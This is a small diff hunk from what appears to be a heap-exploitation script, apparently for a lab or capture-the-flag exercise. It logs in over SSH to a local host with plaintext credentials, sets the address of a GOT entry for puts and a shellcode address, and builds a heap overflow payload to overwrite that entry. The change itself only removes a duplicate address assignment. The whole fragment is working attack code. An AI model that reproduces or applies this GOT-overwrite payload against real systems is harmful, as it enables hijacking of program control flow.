@@ -8,7 +8,6 @@ shell = ssh(user="user", host="192.168.5.199", password="user", port=22)
 GOT_PUTS = 0x0804b128
 SC = 0x804c008 + 8
 
-SC = 0x804c00c
 hpc = HeapPayloadCrafter(0x0804b128, 0x804c008 + 8, post_length=32, pre_length=32)
 prev, metadata, post = hpc.generate_payload()
 
